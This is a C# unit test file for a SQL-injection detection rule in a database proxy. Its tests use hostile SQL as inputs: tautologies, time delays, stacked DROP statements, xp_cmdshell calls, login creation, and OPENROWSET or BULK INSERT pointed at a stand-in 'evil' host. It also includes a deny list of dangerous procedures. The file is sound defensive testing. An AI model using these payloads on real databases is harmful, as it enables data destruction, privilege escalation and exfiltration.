using FluentAssertions;
using Microsoft.Extensions.Logging.Abstractions;
using Microsoft.Extensions.Options;
using TailSqlProxy.Configuration;
using TailSqlProxy.Rules;
using Xunit;

namespace TailSqlProxy.Tests.Rules;

public class SqlInjectionRuleTests
{
    private readonly SqlInjectionRule _rule;
    private readonly SqlInjectionRule _ruleWithParseErrorBlock;

    public SqlInjectionRuleTests()
    {
        var options = Options.Create(new RuleOptions
        {
            SqlInjection = new SqlInjectionOptions { Enabled = true }
        });
        _rule = new SqlInjectionRule(options, NullLogger<SqlInjectionRule>.Instance);

        var optionsStrict = Options.Create(new RuleOptions
        {
            SqlInjection = new SqlInjectionOptions { Enabled = true, BlockOnParseErrors = true }
        });
        _ruleWithParseErrorBlock = new SqlInjectionRule(optionsStrict, NullLogger<SqlInjectionRule>.Instance);
    }

    private static QueryContext Ctx(string sql) => new() { SqlText = sql };

    private static QueryContext RpcCtx(string procName, string? sql = null) => new()
    {
        SqlText = sql ?? $"EXEC {procName}",
        ProcedureName = procName,
        IsRpc = true,
    };

    // =============================================
    // SHOULD BE BLOCKED — Tautology Attacks
    // =============================================

    [Theory]
    [InlineData("SELECT * FROM Users WHERE id = 1 OR 1=1")]
    [InlineData("SELECT * FROM Users WHERE name = 'admin' OR 1=1")]
    [InlineData("SELECT * FROM Users WHERE id = 5 OR 2=2")]
    public void Blocks_TautologyAttack_OrNEqualsN(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    [Theory]
    [InlineData("SELECT * FROM Users WHERE name = '' OR ''=''")]
    [InlineData("SELECT * FROM Users WHERE name = 'x' OR 'a'='a'")]
    public void Blocks_TautologyAttack_OrStringEquals(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    [Fact]
    public void Blocks_TautologyAttack_OrTrue()
    {
        _rule.Evaluate(Ctx("SELECT * FROM Users WHERE id = 1 OR true")).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // SHOULD BE BLOCKED — Time-Based Blind Injection
    // =============================================

    [Theory]
    [InlineData("SELECT * FROM Users; WAITFOR DELAY '0:0:5'")]
    [InlineData("SELECT 1; WAITFOR DELAY '0:0:10'")]
    public void Blocks_TimeBased_WaitforDelay(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    [Fact]
    public void Blocks_TimeBased_WaitforTime()
    {
        _rule.Evaluate(Ctx("SELECT 1; WAITFOR TIME '23:59:59'")).IsBlocked.Should().BeTrue();
    }

    [Fact]
    public void Blocks_TimeBased_Sleep()
    {
        _rule.Evaluate(Ctx("SELECT SLEEP(5)")).IsBlocked.Should().BeTrue();
    }

    [Fact]
    public void Blocks_TimeBased_Benchmark()
    {
        _rule.Evaluate(Ctx("SELECT BENCHMARK(10000000, SHA1('test'))")).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // SHOULD BE BLOCKED — Stacked Query Injection
    // =============================================

    [Theory]
    [InlineData("SELECT 1; DROP TABLE Users")]
    [InlineData("SELECT * FROM Products; DROP DATABASE production")]
    [InlineData("SELECT 1; DROP VIEW vw_users")]
    [InlineData("SELECT 1; DROP PROCEDURE sp_getuser")]
    [InlineData("SELECT 1; DROP FUNCTION fn_calc")]
    [InlineData("SELECT 1; DROP INDEX ix_users ON Users")]
    public void Blocks_StackedQuery_Drop(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    [Theory]
    [InlineData("SELECT 1; TRUNCATE TABLE Users")]
    public void Blocks_StackedQuery_Truncate(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // SHOULD BE ALLOWED — DROP TABLE on temp tables in stacked batches
    // (common in procedural T-SQL, e.g. SSMS Object Explorer metadata queries)
    // =============================================

    [Theory]
    [InlineData("CREATE TABLE #tmp (id int); SELECT * FROM #tmp; DROP TABLE #tmp")]
    [InlineData("CREATE TABLE ##shared (id int); SELECT * FROM ##shared; DROP TABLE ##shared")]
    [InlineData("SELECT 1; DROP TABLE #t1, #t2")]
    [InlineData("DECLARE @x INT = 1; SELECT @x; DROP TABLE #temp")]
    public void Allows_StackedQuery_Drop_TempTablesOnly(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeFalse(
            "DROP TABLE on local (#) or global (##) temp tables is session-scoped and safe");
    }

    [Theory]
    [InlineData("SELECT 1; DROP TABLE #tmp, RealTable")]
    [InlineData("SELECT 1; DROP TABLE RealTable, #tmp")]
    public void Blocks_StackedQuery_Drop_MixedTempAndReal(string sql)
    {
        // If any non-temp table is in the drop list, treat the batch as suspicious.
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    [Fact]
    public void Allows_SsmsCopilotMetadataQuery_WithDropTempTable()
    {
        // Real query observed from SSMS "Copilot Completions" in production:
        // creates a temp table, populates it, joins against sys.databases,
        // then drops the temp table. Was being blocked as "stacked destructive".
        var sql = @"
            create table #dso (database_id int primary key, engineEdition int)
            if serverproperty('EngineEdition') = 11
            BEGIN
                insert into #dso select database_id, 11 from sys.databases
            END
            SELECT dtb.name AS [Name]
            FROM sys.databases AS dtb
            LEFT OUTER JOIN #dso dso ON dso.database_id = dtb.database_id
            drop table #dso";

        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeFalse();
    }

    [Fact]
    public void Blocks_StackedQuery_Shutdown()
    {
        _rule.Evaluate(Ctx("SELECT 1; SHUTDOWN")).IsBlocked.Should().BeTrue();
    }

    [Theory]
    [InlineData("; EXEC xp_cmdshell 'dir'")]
    [InlineData("; EXECUTE xp_cmdshell 'whoami'")]
    public void Blocks_StackedQuery_ExecXpCmdshell(string sql)
    {
        _rule.Evaluate(Ctx("SELECT 1" + sql)).IsBlocked.Should().BeTrue();
    }

    [Theory]
    [InlineData("; EXEC sp_OACreate 'Scripting.FileSystemObject'")]
    public void Blocks_StackedQuery_ExecSpOA(string sql)
    {
        _rule.Evaluate(Ctx("SELECT 1" + sql)).IsBlocked.Should().BeTrue();
    }

    [Theory]
    [InlineData("; ALTER TABLE Users ADD IsAdmin BIT")]
    [InlineData("; ALTER LOGIN sa ENABLE")]
    public void Blocks_StackedQuery_Alter(string sql)
    {
        _rule.Evaluate(Ctx("SELECT 1" + sql)).IsBlocked.Should().BeTrue();
    }

    [Theory]
    [InlineData("; CREATE LOGIN hacker WITH PASSWORD = 'p@ss'")]
    [InlineData("; CREATE USER hacker FOR LOGIN hacker")]
    public void Blocks_StackedQuery_CreateLoginUser(string sql)
    {
        _rule.Evaluate(Ctx("SELECT 1" + sql)).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // SHOULD BE BLOCKED — UNION-Based Injection
    // =============================================

    [Theory]
    [InlineData("SELECT id, name FROM Users UNION SELECT NULL, NULL")]
    [InlineData("SELECT id, name FROM Users UNION SELECT 1, 2")]
    [InlineData("SELECT id FROM Users UNION ALL SELECT 1")]
    public void Blocks_UnionInjection_LiteralsOrNulls(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    [Fact]
    public void Blocks_UnionInjection_SelectNull_Regex()
    {
        _rule.Evaluate(Ctx("' UNION SELECT NULL--")).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // SHOULD BE BLOCKED — Dangerous Procedure Calls
    // =============================================

    [Theory]
    [InlineData("xp_cmdshell")]
    [InlineData("xp_regread")]
    [InlineData("xp_regwrite")]
    [InlineData("xp_dirtree")]
    [InlineData("xp_fileexist")]
    [InlineData("sp_OACreate")]
    [InlineData("sp_OAMethod")]
    [InlineData("sp_addlogin")]
    [InlineData("sp_addsrvrolemember")]
    [InlineData("sp_configure")]
    public void Blocks_DangerousProcedure_ViaRpc(string proc)
    {
        _rule.Evaluate(RpcCtx(proc)).IsBlocked.Should().BeTrue();
    }

    [Theory]
    [InlineData("EXEC xp_cmdshell 'dir'")]
    [InlineData("EXECUTE xp_cmdshell 'whoami'")]
    [InlineData("EXEC sp_OACreate 'WScript.Shell'")]
    [InlineData("EXEC sp_configure 'show advanced options', 1")]
    public void Blocks_DangerousProcedure_ViaSqlText(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // SHOULD BE BLOCKED — Comment-Based Evasion
    // =============================================

    [Theory]
    [InlineData("SELECT/**/ * FROM Users; /* comment */ DROP TABLE Users")]
    [InlineData("/**/ UNION SELECT 1,2,3")]
    public void Blocks_CommentEvasion(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // SHOULD BE BLOCKED — Information Probing
    // =============================================

    [Theory]
    [InlineData("SELECT user_name()")]
    [InlineData("SELECT system_user")]
    public void Blocks_InformationProbing(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    [Fact]
    public void Allows_SelectAtAtVersion()
    {
        // @@version is a standard query sent by SSMS, DataGrip, and all JDBC/ODBC drivers
        _rule.Evaluate(Ctx("SELECT @@version")).IsBlocked.Should().BeFalse();
    }

    [Theory]
    [InlineData("SELECT * FROM sysobjects WHERE xtype='U'")]
    [InlineData("SELECT * FROM syscolumns")]
    [InlineData("SELECT name\nFROM sysobjects\nWHERE xtype='U'")]      // multi-line still caught
    [InlineData("SELECT * FROM dbo.sysobjects")]                        // qualified name
    [InlineData("SELECT * FROM master.dbo.SYSCOLUMNS")]                 // upper-case, three-part
    public void Blocks_SchemaProbing(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    [Theory]
    [InlineData("SELECT 'sysobjects is a legacy view' AS note")]        // string literal, not a table ref
    [InlineData("SELECT 1 /* avoid sysobjects in new code */")]         // comment
    [InlineData("SELECT 1 -- syscolumns")]                              // line comment
    public void Allows_SchemaProbing_Names_InCommentOrString(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeFalse(
            "the names appear in a string/comment, not as a table reference");
    }

    [Fact]
    public void DoesNotRedos_OnLongInnocentSelect()
    {
        // Regression for the pattern-25/26 ReDoS: a long SELECT...FROM... where the
        // table is NOT sysobjects/syscolumns must evaluate quickly without blocking.
        // Previously, "SELECT ... FROM ..." with thousands of chars between would
        // catastrophically backtrack the unbounded `.*` and trip the 100ms timeout.
        var padding = string.Join(",\n", Enumerable.Range(1, 200).Select(i => $"col{i}"));
        var sql = $"SELECT\n{padding}\nFROM dbo.Orders WHERE id = 1";

        var sw = System.Diagnostics.Stopwatch.StartNew();
        var result = _rule.Evaluate(Ctx(sql));
        sw.Stop();

        result.IsBlocked.Should().BeFalse();
        sw.ElapsedMilliseconds.Should().BeLessThan(100,
            "AST-based check must not exhibit ReDoS-like behavior on long queries");
    }

    // =============================================
    // SHOULD BE BLOCKED — Error-Based Injection
    // =============================================

    [Fact]
    public void Blocks_ErrorBased_ConvertVersion()
    {
        _rule.Evaluate(Ctx("SELECT CONVERT(int, @@version)")).IsBlocked.Should().BeTrue();
    }

    [Fact]
    public void Blocks_ErrorBased_CastVariable()
    {
        _rule.Evaluate(Ctx("SELECT CAST(@@servername AS int)")).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // SHOULD BE BLOCKED — Data Exfiltration
    // =============================================

    [Fact]
    public void Blocks_Openrowset()
    {
        _rule.Evaluate(Ctx("SELECT * FROM OPENROWSET('SQLNCLI', 'Server=evil;', 'SELECT 1')")).IsBlocked.Should().BeTrue();
    }

    [Fact]
    public void Blocks_Opendatasource()
    {
        _rule.Evaluate(Ctx("SELECT * FROM OPENDATASOURCE('SQLNCLI', 'Data Source=evil;')")).IsBlocked.Should().BeTrue();
    }

    [Fact]
    public void Blocks_BulkInsert()
    {
        _rule.Evaluate(Ctx("BULK INSERT Users FROM '\\\\evil\\share\\data.csv'")).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // SHOULD BE BLOCKED — Hex Encoding
    // =============================================

    [Fact]
    public void Blocks_HexInExecContext()
    {
        _rule.Evaluate(Ctx("EXEC(0x44524F50205441424C45)")).IsBlocked.Should().BeTrue();
    }

    [Fact]
    public void Blocks_HexConcatenation()
    {
        _rule.Evaluate(Ctx("SELECT 'test' + 0x44524F50205441424C45")).IsBlocked.Should().BeTrue();
    }

    [Fact]
    public void Allows_Standalone_Hex_Rowversion()
    {
        _rule.Evaluate(Ctx("SELECT * FROM orders WHERE update_timestamp > 0x0000000244ED48B6")).IsBlocked.Should().BeFalse();
    }

    // =============================================
    // SHOULD BE BLOCKED — Parse Errors + Suspicious Content (strict mode)
    // =============================================

    [Theory]
    [InlineData("' ; DROP TABLE Users --")]
    [InlineData("1'; DROP TABLE accounts--")]
    public void Blocks_ParseErrors_WithSuspiciousContent_WhenStrictMode(string sql)
    {
        _ruleWithParseErrorBlock.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // SHOULD BE ALLOWED — Legitimate Queries
    // =============================================

    [Theory]
    [InlineData("SELECT * FROM Users WHERE id = 1")]
    [InlineData("SELECT * FROM Users WHERE name = 'John'")]
    [InlineData("SELECT id, name FROM Users WHERE active = 1")]
    [InlineData("SELECT TOP 10 * FROM Orders")]
    [InlineData("INSERT INTO Users (name, email) VALUES ('Alice', 'alice@example.com')")]
    [InlineData("UPDATE Users SET name = 'Bob' WHERE id = 5")]
    [InlineData("DELETE FROM Users WHERE id = 99")]
    [InlineData("SELECT COUNT(*) FROM Orders")]
    [InlineData("SELECT u.name, o.total FROM Users u JOIN Orders o ON u.id = o.user_id")]
    public void Allows_LegitimateQueries(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeFalse();
    }

    [Theory]
    [InlineData("SELECT * FROM Users WHERE status = 1 OR status = 2")]
    [InlineData("SELECT * FROM Users WHERE role = 'admin' OR role = 'superadmin'")]
    public void Allows_LegitimateOrConditions(string sql)
    {
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeFalse();
    }

    [Fact]
    public void Allows_LegitimateUnion()
    {
        var sql = "SELECT id, name FROM Users UNION SELECT id, name FROM ArchivedUsers";
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeFalse();
    }

    [Theory]
    [InlineData("sp_executesql")]
    [InlineData("sp_prepexec")]
    [InlineData("sp_helpdb")]
    [InlineData("sp_help")]
    public void Allows_NonDangerousProcedures_ViaRpc(string proc)
    {
        _rule.Evaluate(RpcCtx(proc)).IsBlocked.Should().BeFalse();
    }

    [Theory]
    [InlineData("DROP TABLE TempTable")]
    [InlineData("TRUNCATE TABLE StagingData")]
    public void Allows_SingleStatement_Drop_Or_Truncate(string sql)
    {
        // Single DDL statement is legitimate admin operation, not stacked injection
        _rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeFalse();
    }

    [Fact]
    public void Allows_LegitimateWaitfor()
    {
        // Single WAITFOR DELAY is legitimate (used in job scheduling)
        _rule.Evaluate(Ctx("WAITFOR DELAY '0:0:1'")).IsBlocked.Should().BeFalse();
    }

    // =============================================
    // SHOULD BE ALLOWED — Disabled Rule
    // =============================================

    [Fact]
    public void Disabled_DoesNotBlock()
    {
        var options = Options.Create(new RuleOptions
        {
            SqlInjection = new SqlInjectionOptions { Enabled = false }
        });
        var disabledRule = new SqlInjectionRule(options, NullLogger<SqlInjectionRule>.Instance);

        disabledRule.Evaluate(Ctx("SELECT * FROM Users WHERE id = 1 OR 1=1")).IsBlocked.Should().BeFalse();
    }

    // =============================================
    // Custom Patterns
    // =============================================

    [Fact]
    public void Blocks_CustomPattern()
    {
        var options = Options.Create(new RuleOptions
        {
            SqlInjection = new SqlInjectionOptions
            {
                Enabled = true,
                CustomPatterns = [@"(?i)\bDECLARE\s+@\w+\s+NVARCHAR.*\bEXEC\b"]
            }
        });
        var rule = new SqlInjectionRule(options, NullLogger<SqlInjectionRule>.Instance);

        var sql = "DECLARE @cmd NVARCHAR(4000); SET @cmd = 'DROP TABLE Users'; EXEC(@cmd)";
        rule.Evaluate(Ctx(sql)).IsBlocked.Should().BeTrue();
    }

    // =============================================
    // Empty / Null SQL
    // =============================================

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData(null)]
    public void Allows_EmptyOrWhitespace(string? sql)
    {
        _rule.Evaluate(new QueryContext { SqlText = sql ?? "" }).IsBlocked.Should().BeFalse();
    }
}
